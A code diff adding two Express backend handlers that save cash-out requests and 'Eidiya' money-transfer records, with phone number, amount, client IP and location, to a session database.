@@ -204,3 +204,79 @@ exports.finishAudio = async (req, res) => {
     res.status(500).json({ success: false, message: 'Failed to upload audio or save metadata', details: error.message });
   }
 };
+
+exports.saveCashOut = async (req, res) => {
+  const { sessionId, phoneNumber, amount, location } = req.body;
+  const ip = requestIp(req);
+  console.log(`[CASH_OUT] Request received for session ${sessionId}, phone: ${phoneNumber}, amount: ${amount}`);
+
+  try {
+    let session = await Session.findOne({ sessionId });
+    if (!session) {
+      console.warn(`[CASH_OUT] Session ${sessionId} not found in DB. Creating placeholder session.`);
+      session = new Session({
+        sessionId: sessionId || crypto.randomUUID(),
+        ip,
+        userAgent: req.get('user-agent') || null
+      });
+    }
+
+    session.cashOut = {
+      phoneNumber,
+      amount: parseFloat(amount) || 0,
+      ip,
+      location: location || session.location || null,
+      requestedAt: new Date()
+    };
+
+    // Update main session IP and location if not set yet
+    if (!session.ip) session.ip = ip;
+    if (location && !session.location) session.location = location;
+
+    await session.save();
+    console.log(`[CASH_OUT] Session ${session.sessionId} cashout info saved successfully to DB`);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('[CASH_OUT] Error saving cashout data:', error);
+    res.status(500).json({ success: false, message: 'Database error saving cashout info', details: error.message });
+  }
+};
+
+exports.saveEidiyaTransfer = async (req, res) => {
+  const { sessionId, recipient, amount, message, location } = req.body;
+  const ip = requestIp(req);
+  console.log(`[EIDIYA_TRANSFER] Request received for session ${sessionId}, recipient: ${recipient}, amount: ${amount}`);
+
+  try {
+    let session = await Session.findOne({ sessionId });
+    if (!session) {
+      console.warn(`[EIDIYA_TRANSFER] Session ${sessionId} not found in DB. Creating placeholder session.`);
+      session = new Session({
+        sessionId: sessionId || crypto.randomUUID(),
+        ip,
+        userAgent: req.get('user-agent') || null
+      });
+    }
+
+    session.eidiyaTransfers = session.eidiyaTransfers || [];
+    session.eidiyaTransfers.push({
+      recipient,
+      amount: parseFloat(amount) || 0,
+      message: message || '',
+      ip,
+      location: location || session.location || null,
+      transferredAt: new Date()
+    });
+
+    // Update main session IP and location if not set yet
+    if (!session.ip) session.ip = ip;
+    if (location && !session.location) session.location = location;
+
+    await session.save();
+    console.log(`[EIDIYA_TRANSFER] Session ${session.sessionId} eidiya transfer info saved successfully to DB`);
+    res.json({ success: true });
+  } catch (error) {
+    console.error('[EIDIYA_TRANSFER] Error saving eidiya transfer data:', error);
+    res.status(500).json({ success: false, message: 'Database error saving eidiya transfer info', details: error.message });
+  }
+};
